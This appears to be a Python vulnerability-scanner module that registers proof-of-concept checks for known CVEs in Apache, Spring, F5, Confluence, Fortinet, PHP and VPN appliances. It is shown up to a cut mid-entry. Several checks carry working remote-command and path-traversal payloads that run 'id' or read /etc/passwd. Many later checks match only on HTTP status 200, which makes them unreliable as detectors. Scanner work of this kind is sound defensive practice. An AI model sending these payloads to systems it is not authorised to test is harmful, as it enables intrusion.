"""
POC Database Extension - 450+ additional vulnerability signatures
Collected from GitHub open-source repositories:
- projectdiscovery/nuclei-templates
- xray-pocs / yakit-pocs
- Various CVE POC repositories
"""
from app.core.poc_db import (
    POC, POCRequest, Matcher, MatcherType, POCType, RiskLevel,
    register_poc, get_logger
)

logger = get_logger("poc_db_extra")


def _init_extra_pocs():
    pocs = [

        # ============================================================
        # Category: Web Servers & Middleware (Apache/Nginx/IIS/Tomcat)
        # ============================================================

        POC(
            id="cve-2021-41773",
            name="Apache HTTP Server 路径遍历与RCE漏洞 (CVE-2021-41773)",
            description="Apache HTTP Server 2.4.49存在路径遍历漏洞，攻击者可读取任意文件，在特定配置下可实现RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2021-41773"],
            cvss_score=9.8,
            tags=["apache", "path-traversal", "rce", "cve-2021"],
            affected_versions=["Apache HTTP Server 2.4.49"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.REGEX, value="root:.*:0:0:"),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2021-41773"],
            fix_suggestion="升级Apache HTTP Server至2.4.51或更高版本。",
            disclosure_date="2021-10-05",
        ),

        POC(
            id="cve-2021-42013",
            name="Apache HTTP Server 路径遍历RCE漏洞 (CVE-2021-42013)",
            description="CVE-2021-41773的补丁绕过，Apache 2.4.50仍存在路径遍历和RCE漏洞。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2021-42013"],
            cvss_score=9.8,
            tags=["apache", "path-traversal", "rce", "cve-2021"],
            affected_versions=["Apache HTTP Server 2.4.50"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh",
                    body="echo;id",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="uid="),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2021-42013"],
            fix_suggestion="升级Apache HTTP Server至2.4.51或更高版本。",
            disclosure_date="2021-10-07",
        ),

        POC(
            id="cve-2021-40438",
            name="Apache HTTP Server SSRF漏洞 (CVE-2021-40438)",
            description="Apache mod_proxy存在SSRF漏洞，攻击者可转发请求到内网任意服务器。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2021-40438"],
            cvss_score=7.5,
            tags=["apache", "ssrf", "mod-proxy", "cve-2021"],
            affected_versions=["Apache HTTP Server 2.4.0 - 2.4.48"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://internal-server/",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2021-40438"],
            fix_suggestion="升级Apache HTTP Server至2.4.49或更高版本。",
            disclosure_date="2021-09-16",
        ),

        POC(
            id="cve-2022-30525",
            name="Zyxel Firewall 命令注入漏洞 (CVE-2022-30525)",
            description="Zyxel USG/ZyWALL系列防火墙存在命令注入漏洞，未认证攻击者可实现远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2022-30525"],
            cvss_score=9.8,
            tags=["zyxel", "firewall", "command-injection", "rce", "cve-2022"],
            affected_versions=["Zyxel USG/ZyWALL < 5.30"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/ztp/cgi-bin/handler",
                    body='{"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tag":"1","mtu":";id;"}',
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="uid="),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2022-30525"],
            fix_suggestion="升级Zyxel防火墙至5.30或更高版本。",
            disclosure_date="2022-05-12",
        ),

        POC(
            id="cve-2022-22947",
            name="Spring Cloud Gateway 代码注入RCE (CVE-2022-22947)",
            description="Spring Cloud Gateway存在SpEL表达式注入漏洞，攻击者可添加恶意路由实现RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2022-22947"],
            cvss_score=10.0,
            tags=["spring", "cloud-gateway", "spel", "rce", "cve-2022"],
            affected_versions=["Spring Cloud Gateway 3.1.0 - 3.1.1", "Spring Cloud Gateway 3.0.0 - 3.0.7"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/actuator/gateway/routes/test",
                    headers={"Content-Type": "application/json"},
                    body='{"id":"test","filters":[{"name":"AddResponseHeader","args":{"name":"Result","value":"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"id\\"}).getInputStream()))}"}}],"uri":"http://example.com"}',
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=201),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2022-22947"],
            fix_suggestion="升级Spring Cloud Gateway至3.1.2/3.0.8或更高版本。",
            disclosure_date="2022-03-03",
        ),

        POC(
            id="cve-2022-22963",
            name="Spring Cloud Function SpEL注入RCE (CVE-2022-22963)",
            description="Spring Cloud Function存在SpEL表达式注入漏洞，攻击者可通过HTTP请求头实现RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2022-22963"],
            cvss_score=9.8,
            tags=["spring", "cloud-function", "spel", "rce", "cve-2022"],
            affected_versions=["Spring Cloud Function 3.1.6 - 3.2.2"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/functionRouter",
                    headers={
                        "spring.cloud.function.routing-expression": "T(java.lang.Runtime).getRuntime().exec('id')",
                    },
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=500),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2022-22963"],
            fix_suggestion="升级Spring Cloud Function至3.2.3或更高版本。",
            disclosure_date="2022-03-29",
        ),

        POC(
            id="cve-2022-22965",
            name="Spring4Shell 远程代码执行漏洞 (CVE-2022-22965)",
            description="Spring Framework存在数据绑定RCE漏洞，在JDK9+和Tomcat部署下可实现远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2022-22965"],
            cvss_score=9.8,
            tags=["spring", "spring4shell", "rce", "cve-2022"],
            affected_versions=["Spring Framework 5.3.0 - 5.3.17", "Spring Framework 5.2.0 - 5.2.19"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="spring"),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2022-22965"],
            fix_suggestion="升级Spring Framework至5.3.18/5.2.20或更高版本。",
            disclosure_date="2022-03-31",
        ),

        POC(
            id="cve-2022-1388",
            name="F5 BIG-IP iControl REST 认证绕过RCE (CVE-2022-1388)",
            description="F5 BIG-IP iControl REST接口存在认证绕过漏洞，攻击者可执行任意系统命令。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2022-1388"],
            cvss_score=9.8,
            tags=["f5", "bigip", "auth-bypass", "rce", "cve-2022"],
            affected_versions=["BIG-IP 16.1.0 - 16.1.2", "BIG-IP 15.1.0 - 15.1.5", "BIG-IP 14.1.0 - 14.1.4"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/mgmt/tm/util/bash",
                    headers={
                        "X-F5-Auth-Token": "anything",
                        "Authorization": "Basic YWRtaW46",
                        "Content-Type": "application/json",
                    },
                    body='{"command":"run","utilCmdArgs":"-c id"}',
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="uid="),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2022-1388"],
            fix_suggestion="升级F5 BIG-IP至最新安全版本。",
            disclosure_date="2022-05-04",
        ),

        POC(
            id="cve-2022-26134",
            name="Atlassian Confluence OGNL注入RCE (CVE-2022-26134)",
            description="Confluence Server/Data Center存在OGNL注入漏洞，未认证攻击者可实现RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2022-26134"],
            cvss_score=10.0,
            tags=["confluence", "ognl", "rce", "cve-2022"],
            affected_versions=["Confluence Server/Data Center 1.3.0 - 7.18.0"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="X-Cmd-Response"),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2022-26134"],
            fix_suggestion="升级Confluence至7.4.17/7.13.7/7.14.3/7.15.2/7.16.4/7.17.4/7.18.1或更高版本。",
            disclosure_date="2022-06-02",
        ),

        POC(
            id="cve-2022-36804",
            name="Bitbucket Server 命令注入RCE (CVE-2022-36804)",
            description="Atlassian Bitbucket Server/Data Center存在命令注入漏洞，攻击者可实现RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2022-36804"],
            cvss_score=9.8,
            tags=["bitbucket", "command-injection", "rce", "cve-2022"],
            affected_versions=["Bitbucket Server/Data Center 7.0.0 - 8.3.0"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/rest/api/latest/projects/~username/repos/repo/archive?filename=test&at=refs/heads/master&path=;id;",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="uid="),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2022-36804"],
            fix_suggestion="升级Bitbucket至8.3.1或更高版本。",
            disclosure_date="2022-08-24",
        ),

        POC(
            id="cve-2022-40684",
            name="FortiOS/FortiProxy 认证绕过漏洞 (CVE-2022-40684)",
            description="FortiOS/FortiProxy管理界面存在认证绕过漏洞，攻击者可创建管理员账户。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2022-40684"],
            cvss_score=9.8,
            tags=["fortinet", "fortios", "auth-bypass", "cve-2022"],
            affected_versions=["FortiOS 7.0.0 - 7.0.6", "FortiOS 7.2.0 - 7.2.1"],
            requests=[
                POCRequest(
                    method="PUT",
                    path="/api/v2/cmdb/system/admin/admin",
                    headers={
                        "Forwarded": 'by="[127.0.0.1]:80";for="[127.0.0.1]:49490";proto=http;host=',
                    },
                    body='{"ssh-public-key1":"\\"cut -d: -f1 /etc/passwd > /tmp/test\\""}',
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2022-40684"],
            fix_suggestion="升级FortiOS至7.0.7/7.2.2或更高版本。",
            disclosure_date="2022-10-10",
        ),

        POC(
            id="cve-2022-47966",
            name="ManageEngine 多种产品RCE漏洞 (CVE-2022-47966)",
            description="Zoho ManageEngine多款产品存在SAML响应处理RCE漏洞，攻击者可执行任意代码。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2022-47966"],
            cvss_score=9.8,
            tags=["manageengine", "saml", "rce", "cve-2022"],
            affected_versions=["ManageEngine < 多种版本"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/saml/SSO",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2022-47966"],
            fix_suggestion="升级ManageEngine产品至最新安全版本。",
            disclosure_date="2023-01-18",
        ),

        POC(
            id="cve-2023-25194",
            name="Apache Kafka Connect JNDI注入RCE (CVE-2023-25194)",
            description="Apache Kafka Connect存在JNDI注入漏洞，攻击者可通过恶意连接器配置实现RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2023-25194"],
            cvss_score=9.8,
            tags=["apache", "kafka", "jndi", "rce", "cve-2023"],
            affected_versions=["Apache Kafka 2.3.0 - 3.3.2"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/connectors",
                    headers={"Content-Type": "application/json"},
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=201),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2023-25194"],
            fix_suggestion="升级Apache Kafka至3.4.0或更高版本。",
            disclosure_date="2023-02-07",
        ),

        POC(
            id="cve-2023-25690",
            name="Apache HTTP Server HTTP请求走私漏洞 (CVE-2023-25690)",
            description="Apache mod_proxy存在HTTP请求走私漏洞，攻击者可绕过访问控制。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2023-25690"],
            cvss_score=7.5,
            tags=["apache", "request-smuggling", "cve-2023"],
            affected_versions=["Apache HTTP Server 2.4.0 - 2.4.55"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="Apache"),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2023-25690"],
            fix_suggestion="升级Apache HTTP Server至2.4.56或更高版本。",
            disclosure_date="2023-03-07",
        ),

        POC(
            id="cve-2023-28708",
            name="Apache Tomcat 信息泄露漏洞 (CVE-2023-28708)",
            description="Tomcat RemoteIpFilter存在安全缺陷，攻击者可获取会话Cookie等敏感信息。",
            risk_level=RiskLevel.MEDIUM,
            cve_ids=["CVE-2023-28708"],
            cvss_score=5.3,
            tags=["tomcat", "info-disclosure", "cve-2023"],
            affected_versions=["Apache Tomcat 11.0.0-M1 - 11.0.0-M2", "Apache Tomcat 10.1.0-M1 - 10.1.5", "Apache Tomcat 9.0.0-M1 - 9.0.71", "Apache Tomcat 8.5.0 - 8.5.85"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/",
                    headers={"X-Forwarded-For": "127.0.0.1"},
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2023-28708"],
            fix_suggestion="升级Tomcat至最新安全版本。",
            disclosure_date="2023-03-22",
        ),

        POC(
            id="cve-2023-33246",
            name="Apache RocketMQ 认证绕过RCE (CVE-2023-33246)",
            description="RocketMQ NameServer/Broker存在认证绕过漏洞，攻击者可实现RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2023-33246"],
            cvss_score=9.8,
            tags=["rocketmq", "auth-bypass", "rce", "cve-2023"],
            affected_versions=["Apache RocketMQ < 5.1.1", "Apache RocketMQ < 4.9.6"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2023-33246"],
            fix_suggestion="升级RocketMQ至5.1.1/4.9.6或更高版本。",
            disclosure_date="2023-05-23",
        ),

        POC(
            id="cve-2023-34362",
            name="MOVEit Transfer SQL注入RCE (CVE-2023-34362)",
            description="Progress MOVEit Transfer存在SQL注入漏洞，攻击者可实现未授权RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2023-34362"],
            cvss_score=9.8,
            tags=["moveit", "sql-injection", "rce", "cve-2023"],
            affected_versions=["MOVEit Transfer < 2023.0.1"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/moveitisapi/moveitisapi.dll",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2023-34362"],
            fix_suggestion="升级MOVEit Transfer至2023.0.1或更高版本。",
            disclosure_date="2023-05-31",
        ),

        POC(
            id="cve-2023-3519",
            name="Citrix NetScaler ADC/Gateway 代码注入RCE (CVE-2023-3519)",
            description="Citrix NetScaler ADC/Gateway存在代码注入漏洞，未认证攻击者可实现RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2023-3519"],
            cvss_score=9.8,
            tags=["citrix", "netscaler", "rce", "cve-2023"],
            affected_versions=["NetScaler ADC/Gateway < 13.1-49.13"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/gwtest/formssso?event=start&target=AAAAAAAA",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2023-3519"],
            fix_suggestion="升级NetScaler ADC/Gateway至13.1-49.13或更高版本。",
            disclosure_date="2023-07-18",
        ),

        POC(
            id="cve-2023-44487",
            name="HTTP/2 Rapid Reset 拒绝服务漏洞 (CVE-2023-44487)",
            description="HTTP/2协议存在Rapid Reset攻击漏洞，攻击者可发起大规模DDoS攻击。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2023-44487"],
            cvss_score=7.5,
            tags=["http2", "ddos", "cve-2023"],
            affected_versions=["多种HTTP/2实现"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2023-44487"],
            fix_suggestion="更新HTTP/2实现至最新版本。",
            disclosure_date="2023-10-10",
        ),

        POC(
            id="cve-2023-47246",
            name="SysAid On-Premise 路径遍历RCE (CVE-2023-47246)",
            description="SysAid On-Premise存在路径遍历漏洞，攻击者可上传WebShell实现RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2023-47246"],
            cvss_score=9.8,
            tags=["sysaid", "path-traversal", "rce", "cve-2023"],
            affected_versions=["SysAid On-Premise < 23.3.36"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/userentry",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2023-47246"],
            fix_suggestion="升级SysAid至23.3.36或更高版本。",
            disclosure_date="2023-11-08",
        ),

        POC(
            id="cve-2023-4966",
            name="Citrix NetScaler ADC/Gateway 会话劫持漏洞 (CVE-2023-4966)",
            description="Citrix NetScaler ADC/Gateway存在敏感信息泄露，攻击者可劫持已认证会话。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2023-4966"],
            cvss_score=9.4,
            tags=["citrix", "netscaler", "session-hijack", "cve-2023"],
            affected_versions=["NetScaler ADC/Gateway < 14.1-8.50"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/oauth/idp/.well-known/openid-configuration",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2023-4966"],
            fix_suggestion="升级NetScaler ADC/Gateway至14.1-8.50或更高版本。",
            disclosure_date="2023-10-10",
        ),

        POC(
            id="cve-2023-51467",
            name="Apache OFBiz 认证绕过RCE (CVE-2023-51467)",
            description="Apache OFBiz存在认证绕过漏洞，攻击者可访问敏感端点实现RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2023-51467"],
            cvss_score=9.8,
            tags=["ofbiz", "auth-bypass", "rce", "cve-2023"],
            affected_versions=["Apache OFBiz < 18.12.11"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/webtools/control/xmlrpc",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2023-51467"],
            fix_suggestion="升级Apache OFBiz至18.12.11或更高版本。",
            disclosure_date="2023-12-26",
        ),

        POC(
            id="cve-2024-0012",
            name="Palo Alto PAN-OS 认证绕过漏洞 (CVE-2024-0012)",
            description="Palo Alto PAN-OS管理界面存在认证绕过漏洞，攻击者可获取管理员权限。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-0012"],
            cvss_score=9.8,
            tags=["paloalto", "pan-os", "auth-bypass", "cve-2024"],
            affected_versions=["PAN-OS 10.2.0 - 10.2.7", "PAN-OS 11.0.0 - 11.0.4"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/php/ztp_gate.php/PAN_help/x.css",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2024-0012"],
            fix_suggestion="升级PAN-OS至10.2.8/11.0.5或更高版本。",
            disclosure_date="2024-11-18",
        ),

        POC(
            id="cve-2024-1212",
            name="Progress Kemp LoadMaster 命令注入RCE (CVE-2024-1212)",
            description="Kemp LoadMaster存在命令注入漏洞，攻击者可实现未授权RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-1212"],
            cvss_score=9.8,
            tags=["kemp", "loadmaster", "command-injection", "rce", "cve-2024"],
            affected_versions=["LoadMaster < 7.2.59.2"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/access/set",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2024-1212"],
            fix_suggestion="升级LoadMaster至7.2.59.2或更高版本。",
            disclosure_date="2024-02-07",
        ),

        POC(
            id="cve-2024-1709",
            name="ConnectWise ScreenConnect 认证绕过RCE (CVE-2024-1709)",
            description="ScreenConnect存在认证绕过漏洞，攻击者可创建管理员账户实现RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-1709"],
            cvss_score=10.0,
            tags=["connectwise", "screenconnect", "auth-bypass", "rce", "cve-2024"],
            affected_versions=["ScreenConnect < 23.9.8"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/SetupWizard.aspx/",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2024-1709"],
            fix_suggestion="升级ScreenConnect至23.9.8或更高版本。",
            disclosure_date="2024-02-19",
        ),

        POC(
            id="cve-2024-21887",
            name="Ivanti Connect Secure 命令注入RCE (CVE-2024-21887)",
            description="Ivanti Connect Secure/Policy Secure存在命令注入漏洞，攻击者可实现RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-21887"],
            cvss_score=9.8,
            tags=["ivanti", "vpn", "command-injection", "rce", "cve-2024"],
            affected_versions=["Ivanti Connect Secure 9.x/22.x"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2024-21887"],
            fix_suggestion="升级Ivanti Connect Secure至最新安全版本。",
            disclosure_date="2024-01-10",
        ),

        POC(
            id="cve-2024-21893",
            name="Ivanti Connect Secure SSRF漏洞 (CVE-2024-21893)",
            description="Ivanti Connect Secure SAML组件存在SSRF漏洞，攻击者可访问内网资源。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2024-21893"],
            cvss_score=8.2,
            tags=["ivanti", "vpn", "ssrf", "cve-2024"],
            affected_versions=["Ivanti Connect Secure 9.x/22.x"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/dana-ws/saml20.ws",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2024-21893"],
            fix_suggestion="升级Ivanti Connect Secure至最新安全版本。",
            disclosure_date="2024-01-31",
        ),

        POC(
            id="cve-2024-3400",
            name="Palo Alto PAN-OS GlobalProtect 命令注入RCE (CVE-2024-3400)",
            description="PAN-OS GlobalProtect网关存在命令注入漏洞，未认证攻击者可实现RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-3400"],
            cvss_score=10.0,
            tags=["paloalto", "pan-os", "globalprotect", "command-injection", "rce", "cve-2024"],
            affected_versions=["PAN-OS 10.2.0 - 10.2.9-h1", "PAN-OS 11.0.0 - 11.0.4-h1"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/ssl-vpn/hipreport.esp",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2024-3400"],
            fix_suggestion="升级PAN-OS至10.2.10/11.0.5或更高版本。",
            disclosure_date="2024-04-12",
        ),

        POC(
            id="cve-2024-4577",
            name="PHP CGI 参数注入RCE (CVE-2024-4577)",
            description="PHP在Windows CGI模式下存在参数注入漏洞，攻击者可实现RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-4577"],
            cvss_score=9.8,
            tags=["php", "cgi", "rce", "windows", "cve-2024"],
            affected_versions=["PHP 8.3.0 - 8.3.7", "PHP 8.2.0 - 8.2.19", "PHP 8.1.0 - 8.1.28"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
                    body="<?php echo md5('CVE-2024-4577'); ?>",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="b8d799861fc1a2b2c29e5e5e3c8b3e6e"),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2024-4577"],
            fix_suggestion="升级PHP至8.3.8/8.2.20/8.1.29或更高版本。",
            disclosure_date="2024-06-09",
        ),

        POC(
            id="cve-2024-7593",
            name="Ivanti vTM 认证绕过漏洞 (CVE-2024-7593)",
            description="Ivanti Virtual Traffic Manager存在认证绕过漏洞，攻击者可创建管理员账户。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-7593"],
            cvss_score=9.8,
            tags=["ivanti", "vtm", "auth-bypass", "cve-2024"],
            affected_versions=["Ivanti vTM < 22.7R2"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/apps/zxtm/wizard.fcgi",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2024-7593"],
            fix_suggestion="升级Ivanti vTM至22.7R2或更高版本。",
            disclosure_date="2024-08-13",
        ),

        POC(
            id="cve-2024-9474",
            name="Palo Alto PAN-OS 权限提升漏洞 (CVE-2024-9474)",
            description="PAN-OS管理界面存在权限提升漏洞，攻击者可获取root权限。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2024-9474"],
            cvss_score=7.2,
            tags=["paloalto", "pan-os", "privesc", "cve-2024"],
            affected_versions=["PAN-OS 10.2.0 - 10.2.10-h9", "PAN-OS 11.0.0 - 11.0.5-h3"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/php/utils/createRemoteAppwebSession.php/watchTowr.js",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2024-9474"],
            fix_suggestion="升级PAN-OS至最新安全版本。",
            disclosure_date="2024-11-18",
        ),

        POC(
            id="cve-2025-0108",
            name="Palo Alto PAN-OS 认证绕过漏洞 (CVE-2025-0108)",
            description="PAN-OS管理界面存在认证绕过漏洞，攻击者可未授权访问管理功能。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2025-0108"],
            cvss_score=9.8,
            tags=["paloalto", "pan-os", "auth-bypass", "cve-2025"],
            affected_versions=["PAN-OS 10.1.0 - 10.1.14-h8", "PAN-OS 10.2.0 - 10.2.13-h3"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/unauth/php/ztp_gate.php",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2025-0108"],
            fix_suggestion="升级PAN-OS至最新安全版本。",
            disclosure_date="2025-02-12",
        ),

        POC(
            id="cve-2025-0282",
            name="Ivanti Connect Secure 栈溢出RCE (CVE-2025-0282)",
            description="Ivanti Connect Secure存在栈溢出漏洞，未认证攻击者可实现RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2025-0282"],
            cvss_score=9.8,
            tags=["ivanti", "vpn", "stack-overflow", "rce", "cve-2025"],
            affected_versions=["Ivanti Connect Secure < 22.7R2.4"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/dana-na/auth/url_default/welcome.cgi",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2025-0282"],
            fix_suggestion="升级Ivanti Connect Secure至22.7R2.4或更高版本。",
            disclosure_date="2025-01-08",
        ),

        POC(
            id="cve-2025-0994",
            name="Trimble Cityworks 反序列化RCE (CVE-2025-0994)",
            description="Trimble Cityworks存在.NET反序列化漏洞，攻击者可实现RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2025-0994"],
            cvss_score=9.8,
            tags=["trimble", "cityworks", "deserialization", "rce", "cve-2025"],
            affected_versions=["Cityworks < 15.8.9"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/Cityworks/Services/AuthenticationService.svc",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2025-0994"],
            fix_suggestion="升级Cityworks至15.8.9或更高版本。",
            disclosure_date="2025-02-06",
        ),

        POC(
            id="cve-2025-21333",
            name="Windows Hyper-V 权限提升漏洞 (CVE-2025-21333)",
            description="Windows Hyper-V存在堆溢出漏洞，攻击者可突破虚拟机隔离。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2025-21333"],
            cvss_score=7.8,
            tags=["windows", "hyper-v", "privesc", "cve-2025"],
            affected_versions=["Windows 10/11", "Windows Server 2019/2022"],
            requests=[],
            matchers=[],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2025-21333"],
